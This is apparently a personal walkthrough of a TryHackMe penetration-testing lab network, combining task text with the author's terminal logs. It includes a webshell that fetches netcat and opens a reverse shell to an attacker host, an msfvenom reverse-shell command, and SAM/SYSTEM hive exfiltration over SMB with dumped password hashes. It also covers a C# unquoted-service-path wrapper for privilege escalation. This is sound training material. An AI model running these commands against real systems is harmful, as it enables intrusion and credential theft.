+CertUtil: -dump command completed successfully.
+
+http://10.200.87.100/resources/uploads/shell-witty.jpeg.php?wreath=curl%20http://10.50.88.115/nc64.exe%20-o%20c:\\windows\\temp\\nc64-witty.exe
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo python3 -m http.server 80
+[sudo] password for witty: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.200.87.100 - - [17/Jun/2023 15:49:24] "GET /nc64.exe HTTP/1.1" 200 -
+
+http://10.200.87.100/resources/uploads/shell-witty.jpeg.php?wreath=powershell.exe%20c:\\windows\\temp\\nc64-witty.exe%2010.50.88.115%20443%20-e%20cmd.exe
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.50.88.115] from (UNKNOWN) [10.200.87.100] 50138
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\resources\uploads>whoami
+whoami
+wreath-pc\thomas
+```
+**Bonus Question (optional):** Follow the steps detailed above to compile a copy of netcat.exe (otherwise use the copy already in the repo).
+Completed
+With a copy of netcat available, we now need to get it up to the target.
+Start a Python webserver on your attacking machine (as demonstrated numerous times previously):
+`sudo python3 -m http.server 80   `
+Completed
+Despite it often being much harder to upload binaries to Windows than it is to upload to Linux, we do have a few options here.
+- Powershell _might_ work, but with AMSI in play it's a risk.
+- We could use the file upload point that we originally exploited to upload an unrestricted PHP file uploader (in the same way that we uploaded the original webshell, although this would be a bit of a pain with embedding the uploader in an image).
+- We could look for other command line tools installed on the target such as `curl.exe` or `certutil.exe`, both of which might allow for a file upload.
+Try to execute both of this in the webshell -- both should work.
+What output do you get when running the command: `certutil.exe`?
+*CertUtil: -dump command completed successfully.*
+Certutil is a default Windows tool that is used to (amongst other things) download CA certificates. This also makes it ideal for file transfers, _but_ Defender flags this as malicious.
+Instead we'll stick with trusty old cURL.
+Use cURL to upload your new copy of netcat to the target:
+`curl http://ATTACKER_IP/nc.exe -o c:\\windows\\temp\\nc-USERNAME.exe   `
+Note the double backslashes used here. This is purely due to how the webshell handles backslashes. We need to escape the backslashes so that they are passed in as a part of the command, as opposed to escaping the letters immediately after them.
+Completed
+We now have everything we need to get a reverse shell back from this target.
+Set up a netcat listener on your attacking machine, then, in your webshell, use the following command:
+`powershell.exe c:\\windows\\temp\\nc-USERNAME.exe ATTACKER_IP ATTACKER_PORT -e cmd.exe   `
+e.g.
+`powershell.exe c:\\windows\\temp\\nc-MuirlandOracle.exe 10.50.73.2 443 -e cmd.exe   `
+This should result in a reverse shell from the target!
+![Confirmation of a reverse shell being received](https://assets.tryhackme.com/additional/wreath-network/ac7e2a438cd5.png)
+_**Note:** In order for this to work we had to wrap the netcat command inside a powershell process to keep it from exiting early._
+Completed
+**Bonus Question (optional):** Try generating a metasploit reverse shell and transfer it to the target (`msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=ATTACKING_IP LPORT=CHOOSE_A_PORT`) -- make sure to place it in a directory you can list (e.g. the Uploads directory of the webserver). This shell will get picked up by Defender (so don't do it anywhere else!), but it will give you a feel for how antivirus operates when it detects your payload as being malicious.
+You should get an error message when trying to execute the executable and the exe will also disappear from the current directory (placed into quarantine by the AV). At this point the Administrator has also been alerted, along with the security team in a bigger organisation.
+Completed
+[**Video**](https://youtu.be/xPG1YtQiXLc)
+Data exfiltration is something that should _never_ be considered without explicit prior consent. Generally speaking, most external engagements will strongly prohibit taking data from compromised systems; however, it is worth bearing in mind that this may not be the case for internal engagements -- and some external engagements outright set targets for the red team that revolve around exfiltrating a set piece of data from the targets once compromised. Even if this is a skill that may not be used on a daily basis, it is still well worth learning.
+---
+The goal of exfiltration is always to remove data from a compromised target. This could be things like passwords, keys, customer/employee data, or anything else of use or value. If the data being exfiltrated is in plain text then this could be as simple as copying and pasting the contents of a file from a remote shell into a local file. If the data is in a binary format, or otherwise can't just be copied and pasted, then more complicated methods must be used to exfiltrate the targeted file.
+A common method for exfiltrating data is to smuggle it out within a harmless protocol, usually encoded. For example, DNS is often used to (relatively) quietly exfiltrate data. HTTPS tends to be a good option as the data will outright be encrypted before egress takes place. ICMP can be used to (very slowly) get the data out of the network. DNS-over-HTTPS is superb for data exfiltration, and even email is often used.
+In a real world situation an attacker will be looking to exfiltrate data as quietly as possible as there may be an Intrusion Detection System active on the compromised network which would alert the network administrators to a breach should the data be detected. For this reason an attacker is unlikely to use protocols as simple as FTP, TFTP, SMB or HTTP; however, in an unmonitored network these are still good options for moving files around.
+It's worth noting that most command and control (C2) frameworks come with options to quietly exfiltrate data. Practically speaking, this is likely how a bad actor would be exfiltrating data, so it's worth keeping up to date with the current "standards" used by the various frameworks. There are also plenty of standalone tools available to automate sending and receiving obfuscated data.
+---
+In short, the only limitation when it comes to exfiltration is your imagination. Whilst there are certainly common techniques available (and many tools around to take advantage of them) it will always be the new and obscure methods that are the most successful. Who knows? Maybe you'll even find a legitimate use for steganography!
+As extra reading, [PentestPartners](https://www.pentestpartners.com/) have a superb [blog post](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/) on this topic.
+Answer the questions below
+```text
+C:\Windows\system32>reg.exe save HKLM\SAM sam.bak
+reg.exe save HKLM\SAM sam.bak
+The operation completed successfully.
+
+C:\Windows\system32>reg.exe save HKLM\SYSTEM system.bak
+reg.exe save HKLM\SYSTEM system.bak
+The operation completed successfully.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share2 . -smb2support -username user -password s3cureP@ssword
+[sudo] password for witty: 
+Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.200.87.100,50089)
+[*] AUTHENTICATE_MESSAGE (\user,WREATH-PC)
+[*] User WREATH-PC\user authenticated successfully
+[*] user:::aaaaaaaaaaaaaaaa:98a8caccef1b4f941892e82483fc43b0:010100000000000000237dda9ca3d90149b12196be09953a00000000010010004e005000780071005100790070006c00030010004e005000780071005100790070006c00020010005900740041006f007900690054004600040010005900740041006f0079006900540046000700080000237dda9ca3d901060004000200000008003000300000000000000000000000004000005913e47e62e249426e2d72221fa155ea8b514316d176ef09940e0ce42b9359f00a001000000000000000000000000000000000000900220063006900660073002f00310030002e00350030002e00380038002e003100310035000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:share2)
+
+C:\Windows\system32>net use \\10.50.88.115\share2 /USER:user s3cureP@ssword
+net use \\10.50.88.115\share2 /USER:user s3cureP@ssword
+The command completed successfully.
+
+C:\Windows\system32>net use /delete \\10.50.88.115\share2
+net use /delete \\10.50.88.115\share2
+\\10.50.88.115\share2 was deleted successfully.
+
+C:\Windows\system32>net use \\10.50.88.115\share3 /USER:user3 s3cureP@ssword
+net use \\10.50.88.115\share3 /USER:user3 s3cureP@ssword
+The command completed successfully.
+
+C:\Windows\system32>net use
+net use
+New connections will be remembered.
+
+Status       Local     Remote                    Network
+
+-------------------------------------------------------------------------------
+OK                     \\10.50.88.115\share3     Microsoft Windows Network
+The command completed successfully.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share3 . -smb2support -username user3 -password s3cureP@ssword
+Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.200.87.100,50130)
+[*] AUTHENTICATE_MESSAGE (\user3,WREATH-PC)
+[*] User WREATH-PC\user3 authenticated successfully
+[*] user3:::aaaaaaaaaaaaaaaa:f3109e28ee8067e9eed0baf9cf001543:010100000000000080d359c29da3d9015c10e91bef936907000000000100100054005500420062004100580068006f000300100054005500420062004100580068006f00020010004300470053006900410077006700770004001000430047005300690041007700670077000700080080d359c29da3d901060004000200000008003000300000000000000000000000004000005913e47e62e249426e2d72221fa155ea8b514316d176ef09940e0ce42b9359f00a001000000000000000000000000000000000000900220063006900660073002f00310030002e00350030002e00380038002e003100310035000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:share3)
+[*] Disconnecting Share(1:IPC$)
+[*] Connecting Share(3:IPC$)
+[*] Disconnecting Share(3:IPC$)
+
+C:\Windows\system32>move sam.bak \\10.50.88.115\share3\sam.bak
+move sam.bak \\10.50.88.115\share3\sam.bak
+        1 file(s) moved.
+
+C:\Windows\system32>move system.bak \\10.50.88.115\share3\system.bak
+move system.bak \\10.50.88.115\share3\system.bak
+        1 file(s) moved.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ secretsdump.py -sam sam.bak -system system.bak LOCAL 
+Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
+
+[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
+Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
+[*] Cleaning up...
+```
+Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?
+*Nay*
+For what reason is HTTPS preferred over HTTP during exfiltration?
+E___yp__on
+*Encryption*
+---
+Let's put this into practice!
+We need some way to prove to Thomas that we've compromised his PC. We could leave a note on his Desktop, or we could be fancy and give him his Administrator password hash to prove that we've rooted it.
+There's no way we're going to get Mimikatz past Defender. We have SYSTEM access, so we could technically just disable Defender, but let's try to do this with as little destructiveness as possible (not least for other users on the network). What we _can_ do is grab the files containing the password hashes, pass them back to our attacking machine, then dump the hashes locally. On Linux this would be a simple matter of grabbing `/etc/shadow`. On Windows it is slightly more complex than that.
+Local user hashes are stored in the Windows Registry whilst the computer is running -- specically in the `HKEY_LOCAL_MACHINE\SAM` hive. This can also be found as a file at `C:\Windows\System32\Config\SAM`, however, this should not be readable whilst the computer is running. To dump the hashes locally, we first need to save the SAM hive:
+`reg.exe save HKLM\SAM sam.bak   `
+This saves the hive as a file called "sam.bak" in the current directory.
+Dumping the SAM hive isn't quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine:
+`reg.exe save HKLM\SYSTEM system.bak   `
+With both Hives dumped, we can exfiltrate them back to our attacking machine to dump the hashes out of sight of Defender.
+It's up to you how you choose to exfiltrate the files. Given this is a home network with no monitoring in place, an SMB server is recommended. Connect to your SMB server using your SYSTEM reverse shell with the `net use` command. You can now either save the files directly to your own drive, or move the files to your attacking machine if you already dumped the hives, e.g:
+`reg.exe save HKLM\SAM \\ATTACKING_IP\share\sam.bak`
+or
+`move sam.bak \\ATTACKING_IP\share\sam.bak   `
+_**Note:** You may encounter an error when reconnecting. This is due to the way that Windows handles cached credentials:
+_![System Error 1312 relating to a logon session not existing](https://assets.tryhackme.com/additional/wreath-network/52376f416ede.png)
+_System error 1312 can usually be solved by connecting using an arbitrary domain. For example, specifying_ `/USER:domain\user` _rather than just the username. The same SMB server will still work here; however, Windows sees it as a different user account and thus allows the new connection._
+With both files stored locally, we can now dump some hashes! Make sure you delete the .bak files from the target if you copied them rather than moving them.
+Once again, remember to disconnect from the SMB server!
+Completed
+There are a variety of tools that could do this job for us. The most reliable is (as is often the case), a script from the Impacket library: `secretsdump.py`.
+Let's use this against our dumped hives:
+`python3 /opt/impacket/examples/secretsdump.py -sam PATH/TO/SAM_FILE -system PATH/TO/SYSTEM_FILE LOCAL   `
+![Demonstration of using Impacket against the dumped hives. Password hashes are obtained.](https://assets.tryhackme.com/additional/wreath-network/28853bc2be23.png)
+---
+What is the Administrator NT hash for this target?
+*a05c3c807ceeb48c47252568da284cd2*
+We have now completed everything we set out to accomplish: demonstrating that Wreath's network is vulnerable. Take this chance to go through the network and clean up after yourself. Aside from being courteous to other users of the network, this is also something you should always do in real life; we wouldn't want to make things easy for an attacker, would we?
+Remove all the tools, shells, payloads, accounts, and any other remnants you left behind.
+Question Done
+### Task 45  Conclusion Debrief & Report
+[**Video**](https://youtu.be/JKbUlVTA8uA)
+We started this assignment with three targets. One Linux, two Windows.
+All three have now been fully compromised -- well done!
+Hopefully you've been taking notes and are now about to start writing a report on the topic. If you're not familiar with pentest reports, the following task may come in handy. Additionally, Offensive Security have also published an example penetration test report [here](https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf), and there is a whole community-curated repository of public reports [here](https://github.com/juliocesarfort/public-pentesting-reports) should you need more inspiration.
+---
+Penetration test reports are generally split into several sections. There is no strictly defined standard unfortunately, but the following layout should be well received:
+- First up is the **_Executive Summary_**. This should be essentially non-technical, providing a brief overview of the job that was contracted to (and completed by) the pentester, including a concise summary of the scope of the engagement. You should also include a very short summary of the results here, as well as a concise analysis of the overall security posture of the company. Be aware thought that, as the name suggests, this section is designed to be read by the higher-ups in a company who may not have a technical background or the time to devote to a long-winded explanation. This section is particularly important as in many cases it may be the only section that the client actually looks at. It should catch the eye, and will set the tone for the rest of the report.
+- At the end of (or immediately after) the executive summary include a _**Timeline**_ showing an overview of what you did and when you did it. This allows whoever is assigned to fix the vulnerabilities to check any logs from the compromised system and see what a successful attack looks like from their own privileged perspective.
+- Next we have the _**Findings and Remediations**_ section. This should be a more technical section. It should provide a detailed explanation of the ![222](https://assets.tryhackme.com/additional/wreath-network/ZGQ1N2QwNWU5.png)vulnerabilities you found _as well as your suggested fixes for these._ Additionally, you should indicate the severity of each vulnerability, and the risk to the company should the vulnerability be exploited by a bad actor -- the [CVSS calculator](https://www.first.org/cvss/calculator/3.1) will be useful for this. You should not necessarily be providing a step-by-step account of your methodology here, but there should be enough detail for a technically-able person to see what the problem is, and what the solutions might be.
+- After the findings and remediations should come the _**Attack Narrative**_. This _should_ be a step-by-step writeup of the actions you took against the targets, including enough detail for a technically-competent individual to replicate the attacks exactly in an almost copy-and-paste approach. In many ways this is similar to a detailed write-up for a CTF.
+- A section that is good to include but often skipped: the _**Cleanup**_ section. This should detail the actions you took to eradicate your presence on the targets (e.g. removing any added accounts, deleting exploits or created files, etc).
+- Next (but not last), there should be a _**Conclusion**_. This just summarises the report, rounding off the results and stressing the importance of patching as required.
+- Finally you should include _**References**_ then _**Appendices**_. The references section includes full references to any works cited throughout the report (for example, maybe a quote or table from the OWASP website, or referencing a newspaper article on an attack which utilised a vulnerability found in the target network). The references section should also be used to link to relevant CVEs (Common Vulnerability and Exposure), CWEs (Common Weakness Enumerations), and/or CAPECs (Common Attack Pattern Enumerations and Classifications) for the found vulnerabilities. Your appendices should include any large pieces of information that would have cluttered up the main text. For example, if you had to edit an exploit (as we did during the Wreath network), you should include a full copy of the edited code as an appendix and reference it when mentioned in the other sections. Equally, any code you write should also be stored here (with the exception of short snippets and one-liners, which can be placed inline at the relevant section), along with any large amounts of data or big tables / diagrams.
+So, the sections should be:
+1. Executive Summary
+2. Timeline
+3. Findings and Remediations
+4. Attack Narrative
+5. Cleanup
+6. Conclusion
+7. References
+8. Appendices
+Pentest reports will usually also have a branded front-cover and a table of contents before the report itself begins.
+There are many pentest report templates available on the Internet which can be used to provide a baseline for this. Many companies will also provide their penetration testers with a company-specific template to follow. Regardless, of whether you use a pre-built template or create your own, find a style and stick with it!
+---
+_With your report written and proof-read, you send the PDF to Thomas then sit back and relax, your work is done!_
+Answer the questions below
+Write a report (or just read the information in the task).
+Question Done
+If you write a report you are welcome to keep it for your own records, or submit it to the room as a writeup for others to read!
+In the real-world, a section of the pre-engagement meetings between the client and the pentesting company would set out expectations for report handling procedures. This would cover things like the delivery method for the report (i.e. how will it be transferred securely between the consultants and the clients), as well as how (and when) consultant copies of the report should be disposed of. Clients obviously do _not_ want a report detailing their technical vulnerabilities falling into the wrong hands, so this section is very important.
+---
+_**Important!**_
+Consider the following brief to be the "report-handling procedures" for this assignment:
+_Reports should be written in English and submitted as PDFs hosted on Github, Google Drive or somewhere else on the internet to be viewed in the browser with no downloads required. Reports should not contain answers to questions, as far as is possible (i.e. host names are fine, passwords or password hashes are not). As you are being encouraged to write these in the format of a penetration test report, writeups submitted in other formats will_ not _be accepted to the room. If you want to do a video walkthrough of the network then this can be linked to at the end of an otherwise complete PDF report._
+Correct Answer
+### Task 46  Conclusion Final Thoughts
+[**Video**](https://youtu.be/JKbUlVTA8uA)
+Thus we reach the conclusion of the Wreath network.
+We covered a wide range of topics in this room -- combined there was a lot of information to absorb, so kudos for getting here! Hopefully you've learnt some new tricks along the way, no matter your prior experience (or at the very least been able to apply known concepts to a new situation).
+This room was designed to be an introduction to the topics covered -- now that you've completed Wreath you should be able to confidentally tackle some of the other networks on the site, if you haven't already.
+A huge shoutout to all of the amazing testers of the Wreath Network!
+In no particular order:
+- [timtaylor](https://tryhackme.com/p/timtaylor)
+- [0day](https://twitter.com/0dayCTF)
+- [briskets](https://tryhackme.com/p/briskets)
+- [NinjaJc01](https://twitter.com/NinjaJc01)
+- [OmegaVoid](https://twitter.com/SubitusNex)
+- [__H](https://twitter.com/TwoUnderscoresH)
+- [Nix](https://twitter.com/_Nixed/)
+- [Wavey](https://twitter.com/itsWavey_)
+- [lukeitslukas](https://twitter.com/lukeitslukas)
+- [Esqy](http://tryhackme.com/p/Esqy)
+- [Varg](https://twitter.com/Vargnaar)
+If you enjoyed this network, keep an eye out for more in the future!
+[@MuirlandOracle](https://twitter.com/MuirlandOracle)
+Answer the questions below
+Network Complete!
+Question Done
+
+## Privilege Escalation
+```text
+C:\xampp\htdocs\resources\uploads>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+C:\xampp\htdocs\resources\uploads>whoami /groups
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288    
+
+C:\xampp\htdocs\resources\uploads>wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
+DisplayName                                                                         Name                                      PathName                                                                                    StartMode  
+Amazon SSM Agent                                                                    AmazonSSMAgent                            "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                          Auto       
+Apache2.4                                                                           Apache2.4                                 "C:\xampp\apache\bin\httpd.exe" -k runservice                                               Auto       
+AWS Lite Guest Agent                                                                AWSLiteAgent                              "C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                            Auto       
+LSM                                                                                 LSM                                                                                                                                   Unknown    
+Mozilla Maintenance Service                                                         MozillaMaintenance                        "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                 Manual     
+NetSetupSvc                                                                         NetSetupSvc                                                                                                                           Unknown    
+Windows Defender Advanced Threat Protection Service                                 Sense                                     "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                  Manual     
+System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto       
+Windows Defender Antivirus Network Inspection Service                               WdNisSvc                                  "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\NisSrv.exe"               Manual     
+Windows Defender Antivirus Service                                                  WinDefend                                 "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2011.6-0\MsMpEng.exe"              Auto       
+Windows Media Player Network Sharing Service                                        WMPNetworkSvc                             "C:\Program Files\Windows Media Player\wmpnetwk.exe"                                        Manual  
+
+C:\xampp\htdocs\resources\uploads>sc qc SystemExplorerHelpService
+sc qc SystemExplorerHelpService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: SystemExplorerHelpService
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : System Explorer Service
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
+
+Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
+Owner  : BUILTIN\Administrators
+Group  : WREATH-PC\None
+Access : BUILTIN\Users Allow  FullControl
+         NT SERVICE\TrustedInstaller Allow  FullControl
+         NT SERVICE\TrustedInstaller Allow  268435456
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  268435456
+         BUILTIN\Administrators Allow  FullControl
+         BUILTIN\Administrators Allow  268435456
+         BUILTIN\Users Allow  ReadAndExecute, Synchronize
+         BUILTIN\Users Allow  -1610612736
+         CREATOR OWNER Allow  268435456
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
+         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
+         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
+Audit  : 
+Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
+         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
+         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
+         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
+         ;;S-1-15-2-2)
+```
+Use the command `whoami /priv`.
+**[Research]** One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?
+*SeImpersonatePrivilege*
+Our current user likely has this privilege due to running XAMPP as a service on the account. Unfortunately this also means that XAMPP won't be a good privesc vector in its own right, but we might be able to use the privileges it gave us!
+---
+Now use `whoami /groups` to check the current user's groups.
+Unfortunately this account isn't in the Local Administrators group as that (combined with the High integrity process we're currently using) would make any further privilege escalation redundant.
+Completed
+Now that we've got an idea of our own user's capabilities. Let's take a look at the box itself.
+Windows services are commonly vulnerable to various attacks, so we'll start there. Generally speaking, it's unlikely that core Windows services will be vulnerable to anything -- user installed services are far more likely to have holes in them.
+Let's start by looking for non-default services:
+`wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`
+This lists all of the services on the system, then filters so that only services that are _not_ in the `C:\Windows` directory are returned. This should cut out most of the core Windows services (which are unlikely to be vulnerable to this kind of vulnerability), leaving us with primarily lesser-known, user-installed services.
+There should be a bunch of results returned here. Read through them, paying particular attention to the `PathName`  column. Notice that one of the paths does not have quotation marks around it.
+What is the Name (second column from the left) of this service?
+*SystemExplorerHelpService*
+The lack of quotation marks around this service path indicates that it might be vulnerable to an _Unquoted Service Path_ attack. In short, if any of the directories in that path contain spaces (which several do) and are writeable (which we are about to check), then -- assuming the service is running as the `NT AUTHORITY\SYSTEM` account, we might be able to elevate privileges.
+First of all, let's check to see which account the service runs under:
+`sc qc SERVICE_NAME   `
+Is the service running as the local system account (Aye/Nay)?
+The SERVICE_NAME will be your answer to the previous question. The answer to the question will be found in the SERVICE_START_NAME attribute.
+*Aye*
+This is looking good!
+Let's check the permissions on the directory. If we can write to it, we are golden:
+`powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"`
+![Image showing the BUILTIN\Users Allow FullControl permission which gives us full control over the directory](https://assets.tryhackme.com/additional/wreath-network/f0b36cf3dfba.png)
+We have full control over this directory! How strange, but hey, Thomas' security oversight will allow us to root this target.
+Completed
+In the interests of learning, it should be noted here that this is far from the only vulnerability here. By the looks of things, Thomas installed the program but couldn't be bothered entering the password for the Administrator account every time he needed to interact with it. As a result, he botched the permissions and gave every user access to every aspect of the program.
+This means that we can create our unquoted service path exploit, but we could also perform attacks such as DLL hijacking, or even outright replacing the service executable with a malicious binary.
+That said, we will stick to the unquoted service path vulnerability purely to avoid messing with the service itself. This way all we need to do is create our own binary then delete it, rather than alter any of the files in the service itself.
+---
+**Bonus Question (optional):** Try to get a copy of WinPEAS up to the target (either the obfuscated executable file, or the batch variant) and run it. You will see that there are many more potential vulnerabilities on this target -- mainly due to patches that haven't been installed.
+Completed
+[**Video**](https://youtu.be/aqBXpE0aweA)
+Let's recap what we found in the previous task:
+- We have a privilege which we could almost certainly use to escalate to system permissions. The downside is that we'd need to obfuscate the exploits in order to get them past Defender.
+- We have an unquoted service path vulnerability for a service running as the system account. This is ideal.
+We have everything we need to root this box. Let's do this!
+Of the two vulnerabilities that are immediately available, we will work through the unquoted service path attack for one simple reason: getting a reverse shell back from this is _very_ easy -- even with Defender in play. The exploits available to manipulate the privilege we found would need to be custom compiled and obfuscated in order to be useful to us; however, with the unquoted service path, all we need is one very small "wrapper" program that activates the netcat binary that we _already have on the target._ To put it another way, we just need to write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system). Ideally we would write a full C# service file that would integrate seamlessly with the Windows service management system. Whilst this is perfectly possible (and is by far the preferable option), for the sake of simplicity, we will stick to just creating a standalone executable. It's worth noting that this technique is effective at bypassing the antivirus software on the target; however, in an enterprise situation there is a good chance that it would be picked up by an intrusion detection system. In this scenario we would be looking for a more sophisticated (if similar) solution.
+Ideally we'd be using Visual Studio here. If you happen to have a Windows host and are familiar with Visual Studio then please feel free to use it for. As not everyone has access to a Windows machine (or is comfortable installing Windows as a virtual machine), the teaching content will work with the `mono` dotnet core compiler for Linux. This can be easily installed on Kali and will allow us to compile C# executables that can be run on Windows targets. The same code will work just fine if compiled in Visual Studio, however.
+---
+First we need to install Mono. This can be done with:
+`sudo apt install mono-devel`
+If you are using the AttackBox then this should already be installed.
+Now, open a file called `Wrapper.cs` in your favourite text editor.
+The first thing we need to do is add our "imports". These allow us to use pre-defined code from other "namespaces" -- essentially giving us access to some basic functions (e.g. input/output). At the very top if the file, add the following lines:
+`using System;   using System.Diagnostics;   `
+These allow us to start new processes (i.e. execute netcat).
+Next we need to initialise a namespace and class for the program:
+`namespace Wrapper{       class Program{           static void Main(){               //Our code will go here!           }       }   }`
+We can now write the code that will call netcat. This goes inside the `Main()` function (replacing the `//Our code will go here!` line).
+First, we create a new process, as well as a ProcessStartInfo object to set the parameters for the process:
+`Process proc = new Process();   ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-USERNAME.exe", "ATTACKER_IP ATTACKER_PORT -e cmd.exe");`
+_Make sure to replace the_ `nc-USERNAME.exe`_with the name of your own netcat executable, as well as slotting in your own IP and Port!_
+With the objects created, we can now configure the process to not create it's own GUI Window when starting:
+`procInfo.CreateNoWindow = true;`
+Finally, we attach the `ProcessStartInfo` object to the process, and start the process!
+`proc.StartInfo = procInfo;   proc.Start();`
+Our program is now complete. It should look something like this:
+![Screenshot of the full program with syntax highlighting](https://assets.tryhackme.com/additional/wreath-network/1680d2c86ef0.png)
+We can now compile our program using the Mono `mcs` compiler. This is extremely simple using the package we installed earlier:
+`mcs Wrapper.cs`
+![Demonstration of compiling with the mcs Wrapper.cs command](https://assets.tryhackme.com/additional/wreath-network/f051e39d81f6.png)
+Answer the questions below
+```text
